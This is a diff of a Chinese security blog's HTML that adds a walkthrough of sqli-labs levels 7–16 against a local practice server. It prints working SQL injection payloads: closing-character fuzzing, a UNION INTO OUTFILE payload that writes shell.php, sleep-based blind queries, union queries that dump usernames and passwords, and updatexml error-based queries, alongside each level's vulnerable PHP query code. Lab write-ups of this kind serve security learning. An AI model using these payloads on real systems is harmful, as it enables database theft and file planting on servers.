@@ -236,6 +236,275 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/28/Sqli-labs Less7-16/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/10/28/Sqli-labs Less7-16/" itemprop="url">Sqli-labs Less7-16</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-28T08:15:41+08:00">
+                2018-10-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>这里笔者是从测试的角度来练习的,通过fuzz猜测闭合符号—&gt;猜测sql语句—&gt;注入利用</p>
+</blockquote>
+<h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7:"></a>less-7:</h2><p>访问第7关地址:<br>按照笔者的理解,sql注入的第一步是去想办法闭合语句,我们在平常挖洞的时候测试sql注入时,碰到<code>http://127.0.0.1:86/less-7/index.php?id=1</code>我们往往会加’测试,但是并不是所有的代码都会用单引号去包裹,我们需要更全面的去fuzz</p>
+<p>这是我测试闭合符号的payload:<br>以less-7为例子:</p>
+<pre><code>http://127.0.0.1:86/less-7/index.php?id=1    正确
+http://127.0.0.1:86/less-7/index.php?id=1%23 正确
+</code></pre><hr>
+<p>fuzz的结果:</p>
+<table>
+<thead>
+<tr>
+<th>paylaod</th>
+<th style="text-align:right">未加%23(#)</th>
+<th style="text-align:right">加注释符(#)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>id=1</td>
+<td style="text-align:right">正确</td>
+<td style="text-align:right">正确</td>
+</tr>
+<tr>
+<td>id=1’</td>
+<td style="text-align:right">错误</td>
+<td style="text-align:right">错误</td>
+</tr>
+<tr>
+<td>id=1’)</td>
+<td style="text-align:right">错误</td>
+<td style="text-align:right">错误</td>
+</tr>
+<tr>
+<td>id=1’))</td>
+<td style="text-align:right">错误</td>
+<td style="text-align:right">正确</td>
+</tr>
+<tr>
+<td>id=1”</td>
+<td style="text-align:right">正确</td>
+<td style="text-align:right">正确</td>
+</tr>
+<tr>
+<td>id=1”)</td>
+<td style="text-align:right">正确</td>
+<td style="text-align:right">正确</td>
+</tr>
+<tr>
+<td>id=1”))</td>
+<td style="text-align:right">正确</td>
+<td style="text-align:right">正确</td>
+</tr>
+<tr>
+<td>id=1)</td>
+<td style="text-align:right">正确</td>
+<td style="text-align:right">正确</td>
+</tr>
+<tr>
+<td>id=1))</td>
+<td style="text-align:right">正确</td>
+<td style="text-align:right">正确</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>如果未加<code>%23(#)</code>显示错误而加上<code>%23(#)</code>显示正确即为闭合符号</p>
+</blockquote>
+<p>我们可看到加上<code>&#39;))</code>这3个字符去访问返回错误,但是在加上注释符(#)去访问就变回正常的了<br>所以我们就可以知道用<code>&#39;))</code>去闭合是正确的,当然这里为了更快速的测试,我把这些放入一个字典当中,用burp的intruder模块去爆破也是可以的:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.12.10.46-image.png" alt="2018-10-29.12.10.46-image.png"><br>根据结果也可判断出<code>&#39;))</code>去闭合是正确的,接下来就是去正常的注入即可:</p>
+<p>判断字段个数</p>
+<pre><code>http://127.0.0.1:86/less-7/index.php?id=1&apos;)) order by 3%23
+http://127.0.0.1:86/less-7/index.php?id=1&apos;)) order by 4%23
+</code></pre><p>得到字段数为3,<br>使用<code>out_file</code>写入文件:</p>
+<pre><code>http://127.0.0.1:86/less-7/index.php?id=1&apos;)) union select 1,&apos;&lt;?php phpinfo();?&gt;&apos;,3 into outfile &apos;C:/web/WWW/sqli-labs-master/Less-7/shell.php&apos;%23
+</code></pre><p>成功写入:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.17.28.55-image.png" alt="2018-10-28.17.28.55-image.png"></p>
+<p>less-7的sql语句为:</p>
+<pre><code>$sql=&quot;SELECT * FROM users WHERE id=((&apos;$id&apos;)) LIMIT 0,1&quot;;
+</code></pre><h2 id="less-8"><a href="#less-8" class="headerlink" title="less-8:"></a>less-8:</h2><p>我们先利用上面的方法得到正确的闭合符号:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.18.25.31-image.png" alt="2018-10-28.18.25.31-image.png"></p>
+<p>是个<code>&#39;</code>闭合无疑了</p>
+<p>因为这里正确页面包含<code>you are in</code> 错误页面无此字符串且没显示错误信息,那么这里我们只能使用盲注来获取信息,可参考笔者之前的文章:<br><a href="https://p0rz9.github.io/2018/10/23/Sqli-labs_Blind_injection_Less5-6/" target="_blank" rel="noopener">Sqli-labs_Blind_injection_Less5-6</a> </p>
+<p>less-8的sql语句为:</p>
+<pre><code>$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;
+</code></pre><h2 id="less-9"><a href="#less-9" class="headerlink" title="less-9:"></a>less-9:</h2><p>我们先利用上面的方法得到正确的闭合符号:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.18.09.07-image.png" alt="2018-10-28.18.09.07-image.png"><br>同样为<code>&#39;</code><br>这里同样没有返回错误信息,再结合less-9的题目:<code>Blind-Time based</code>,我们可知道这里是要使用延时注入的,贴几条payload:</p>
+<pre><code>?id=1&apos; and if((length(user())=14),sleep(5),1)%23 #当前用户长度为14
+?id=1&apos; and if((ascii(substr((select database()),1,1))=115)),sleep(3),1)%23   #数据库第一位是s(ascii码为115)
+?id=1&apos; and if((ascii(substr((select database()),1,1))=115)),sleep(3),1)%23   #数据库第一位是s(ascii码为115)
+</code></pre><p>……..<br>猜解表与字段同理。</p>
+<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.18.42.48-image.png" alt="2018-10-28.18.42.48-image.png"><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.18.42.10-image.png" alt="2018-10-28.18.42.10-image.png"></p>
+<p>less-9的sql语句为:</p>
+<pre><code>$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;
+</code></pre><h2 id="less-10"><a href="#less-10" class="headerlink" title="less-10:"></a>less-10:</h2><p>我们先利用上面的方法得到正确的闭合符号:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.18.50.58-image.png" alt="xxxxx"></p>
+<p><code>&quot;</code>闭合即可</p>
+<p>与less-9同理,只需把payload的闭合符变为<code>&quot;</code>即可</p>
+<p>less-10的sql语句为:</p>
+<pre><code>$id = &apos;&quot;&apos;.$id.&apos;&quot;&apos;;
+$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;
+</code></pre><h2 id="less-11"><a href="#less-11" class="headerlink" title="less-11:"></a>less-11:</h2><p>正确页面:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.20.51.06-image.png" alt="2018-10-28.20.51.06-image.png"></p>
+<p>错误页面:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.20.51.43-image.png" alt="2018-10-28.20.51.43-image.png"></p>
+<p>所以改变下intruder的过滤规则即可,利用上面的方法得到正确的闭合符号:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.20.53.44-image.png" alt="2018-10-28.20.53.44-image.png"></p>
+<p>我们得到 未加注释符(#)错误  加上注释符正确的符号 即为<code>&#39;</code></p>
+<p>那么这里就开始POST注入:</p>
+<pre><code>uname=xxxx&apos; order by 2%23&amp;passwd=admin&amp;submit=Submit    #得到字段数为2
+uname=xxxx&apos; union select 1,2%23&amp;passwd=admin&amp;submit=Submit #得到显错位
+</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.21.03.08-image.png" alt="2018-10-28.21.03.08-image.png"></p>
+<pre><code>#得到user:root@localhost database:security
+uname=xxxx&apos; union select user(),database()%23&amp;passwd=admin&amp;submit=Submit 
+
+#得到全部表名emails,referers,uagents,users
+uname=xxxx&apos; union select (select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;),2%23&amp;passwd=admin&amp;submit=Submit  
+
+#得到users表下的所有字段名 id,username,password
+uname=xxxx&apos; union select (select group_concat(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos;),2&amp;passwd=admin&amp;submit=Submit  
+
+#得到security库下的users下的username,password内容
+uname=xxxx&apos; union select (select group_concat(username,&apos;:&apos;,password) from security.users),2%23&amp;passwd=admin&amp;submit=Submit
+</code></pre><p>less-11的sql语句为:</p>
+<pre><code>@$sql=&quot;SELECT username, password FROM users WHERE username=&apos;$uname&apos; and password=&apos;$passwd&apos; LIMIT 0,1&quot;;
+</code></pre><h2 id="less-12"><a href="#less-12" class="headerlink" title="less-12:"></a>less-12:</h2><p>利用上面的方法得到正确的闭合符号:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.21.25.38-image.png" alt="2018-10-28.21.25.38-image.png"></p>
+<p>得到闭合符号为<code>&quot;)</code><br>然后把<code>less-11</code>的payload中的闭合符号<code>&#39;</code>变为<code>&quot;)</code>即可注入</p>
+<p>less-12源代码:</p>
+<pre><code>$uname=&apos;&quot;&apos;.$uname.&apos;&quot;&apos;;
+$passwd=&apos;&quot;&apos;.$passwd.&apos;&quot;&apos;; 
+@$sql=&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;;
+</code></pre><h2 id="less-13"><a href="#less-13" class="headerlink" title="less-13:"></a>less-13:</h2><p>这里正确内容并不会像上面一样返回name及pwd,而会返回错误sql语句和是否登陆成功的信息,所以这里即可使用报错注入或盲注<br>盲注如下:<br>利用上面的方法得到正确的闭合符号:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.21.30.09-image.png" alt="2018-10-28.21.30.09-image.png"></p>
+<p>得到闭合符号为<code>&#39;)</code></p>
+<p>然后使用报错注入即可,这里列举几个payload:</p>
+<pre><code>uname=admin&apos;) and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23&amp;passwd=admin&amp;submit=Submit
+</code></pre><p>然后将select database()更换为其他查询语句即可得到数据</p>
+<p>盲注参考less-5</p>
+<p>less-13源代码:</p>
+<pre><code>@$sql=&quot;SELECT username, password FROM users WHERE username=(&apos;$uname&apos;) and password=(&apos;$passwd&apos;) LIMIT 0,1&quot;;
+</code></pre><h2 id="less-14"><a href="#less-14" class="headerlink" title="less-14:"></a>less-14:</h2><p>利用上面的方法得到正确的闭合符号:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.21.53.31-image.png" alt="2018-10-28.21.53.31-image.png"></p>
+<p>正确或错误返回内容与less-13一样 只是闭合符号变为了<code>&quot;</code></p>
+<p>所以只需将less-13的payload中的闭合符<code>&#39;)</code>变为<code>&quot;</code>即可注入</p>
+<p>less-14源代码:</p>
+<pre><code>$uname=&apos;&quot;&apos;.$uname.&apos;&quot;&apos;;
+$passwd=&apos;&quot;&apos;.$passwd.&apos;&quot;&apos;; 
+@$sql=&quot;SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1&quot;;
+</code></pre><h2 id="less-15"><a href="#less-15" class="headerlink" title="less-15:"></a>less-15:</h2><p>利用上面的方法得到正确的闭合符号:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.21.58.38-image.png" alt="2018-10-28.21.58.38-image.png"></p>
+<p>所以闭合符号为<code>&#39;</code></p>
+<p>正确错误不会返回错误信息,只是不同内容,所以这里用盲注即可   参考less-5即可<br>less-15源代码:</p>
+<pre><code>@$sql=&quot;SELECT username, password FROM users WHERE username=&apos;$uname&apos; and password=&apos;$passwd&apos; LIMIT 0,1&quot;;
+</code></pre><h2 id="less-16"><a href="#less-16" class="headerlink" title="less-16:"></a>less-16:</h2><p>利用上面的方法得到正确的闭合符号<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.22.02.01-image.png" alt="2018-10-28.22.02.01-image.png"></p>
+<p>这里的情况与less-5相同,只是闭合符号<code>&#39;</code>变为<code>&quot;)</code></p>
+<p>所以也可以用盲注,将闭合符换为<code>&quot;)</code>即可。</p>
+<p>less-16源代码:</p>
+<pre><code>$uname=&apos;&quot;&apos;.$uname.&apos;&quot;&apos;;
+$passwd=&apos;&quot;&apos;.$passwd.&apos;&quot;&apos;; 
+@$sql=&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;;
+</code></pre><hr>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/25/ZZCMSV8.2详细审计/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2323,167 +2592,6 @@ DELETE FROM runoob_tbl WHERE runoob_id=3;
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/12/PHP基础知识/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="P0rZ9">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="P0rZ9's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/10/12/PHP基础知识/" itemprop="url">基础知识 | PHP基础知识</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-12T08:15:41+08:00">
-                2018-10-12
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <blockquote>
-<p>打算将PHP学习的基础知识码出来,持续更新。</p>
-</blockquote>
-<hr>
-<p>php四种标记风格：</p>
-<pre><code>&lt;?php ?&gt; //官方推荐
-&lt;? ?&gt;    //短标记风格 需要在php.ini中设置short_open_tag = on
-&lt;% %&gt;    //ASP风格    需要在php.ini中设置asp_tags = on
-&lt;script language=&quot;php&quot;&gt;代码&lt;/script&gt; //JS标记风格 任意情况都可使用
-</code></pre><p>注释:</p>
-<pre><code>// #        //单行注释
-/*   */     //多行注释
-</code></pre><p>引用赋值：<br><img src="http://static.zybuluo.com/chhyx/nvnvjmhlnfqbjyu8l5lp9pfs/image_1cpj4q7d57ph1jm11qvfeg1sqm1m.png" alt="image_1cpj4q7d57ph1jm11qvfeg1sqm1m.png-39.8kB"><br><img src="http://static.zybuluo.com/chhyx/q58f8ggkquq7i5xocprc2pg9/image_1cpj4nuff1uh41jrh14uc1i9711uop.png" alt="image_1cpj4nuff1uh41jrh14uc1i9711uop.png-47kB"></p>
-<p>字符串:<br>单引号:变量和转义的序列都不会进行转义<br>双引号:PHP会处理双引号括起来的字符串、变量以及转义序列(\n等)</p>
-<p>标识符(定界符)：<br><img src="http://static.zybuluo.com/chhyx/vkgni63ayh1e2xowi3cnum1z/image_1cpj5rk701vlv1ge1d0q106m4c023.png" alt="image_1cpj5rk701vlv1ge1d0q106m4c023.png-37.1kB"></p>
-<p>格式化字符串:<br><img src="http://static.zybuluo.com/chhyx/aourri8psost2uos8z6jqft4/image_1cpj65kpp138a1h1819jb1ufguam2g.png" alt="image_1cpj65kpp138a1h1819jb1ufguam2g.png-32.8kB"></p>
-<p>获取字串位置:</p>
-<pre><code>&lt;?php
-
-$str = &apos;Php is the best,php is my favorite&apos;;
-</code></pre><p>echo substr_count($str,’php’);//出现次数<br>    echo strpos($str,’php’);//返回php第一次出现在$str的位置<br>    echo stripos($str,’php’);//返回php第一次出现在$str的位置 不区分大小写<br>    echo strrpos($str,’php’);//返回php最后一次出现在$str的位置<br>    echo strripos($str,’php’);//返回php最后一次出现在$str的位置 不区分大小写</p>
-<pre><code>?&gt;
-</code></pre><p>字符串替换：<br><img src="http://static.zybuluo.com/chhyx/1w096o9pm7ym6uqyq7qs8yim/image_1cpj76eft8dh1ac5vd5qb12mf2t.png" alt="image_1cpj76eft8dh1ac5vd5qb12mf2t.png-34.9kB"></p>
-<p>正则:</p>
-<pre><code>a.^PHP 匹配以PHP开头的字符串
-  [^a-z] 表示匹配所有非小写字母开头的字符串
-b.PHP$ 匹配以PHP结尾的字符串
-</code></pre><p>c.^PHP$ 精确匹配PHP字符串<br>    d.PHP 匹配所有含有PHP的字符串<br>    e.com|org|net 匹配com、org、net中的任意一个<br>    f.PHP内置通用字符集</p>
-<p><img src="http://static.zybuluo.com/chhyx/gn2bptw7jyzjckdyzluyycnf/image_1cpj7d42p1hji1sahkukfrrhio3q.png" alt="image_1cpj7d42p1hji1sahkukfrrhio3q.png-34.5kB"></p>
-<pre><code>g.使用{}确定重复出现的次数
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/26tsa0smndv6beslkafazqif/image_1cpj7fkmk5fei11gvn1flv1b399.png" alt="image_1cpj7fkmk5fei11gvn1flv1b399.png-35.5kB"></p>
-<p>文件操作:<br>a.目录部分</p>
-<pre><code>$path = &quot;c:/sec/blogs/index/&quot;;
-$file = dirname($path); //返回目录 $file:c:/sec/blogs
-</code></pre><p>b.路径关联数组:</p>
-<pre><code>$pathinfo = pathinfo(&quot;www/test/index.html&quot;);
-//得到一个数组 包含4个值
-echo $pathinfo[&apos;dirname&apos;];//路径 www/test
-echo $pathinfo[&apos;basename&apos;];//基本名 index.html
-echo $pathinfo[&apos;extension&apos;];//扩展名 html
-echo $pathinfo[&apos;filename&apos;];//文件名 index
-</code></pre><p>c.文件部分<br>file<br>open<br>copy<br>file_get_contents</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2534,7 +2642,7 @@ echo $pathinfo[&apos;filename&apos;];//文件名 index
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">44</span>
+                  <span class="site-state-item-count">45</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -2547,7 +2655,7 @@ echo $pathinfo[&apos;filename&apos;];//文件名 index
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
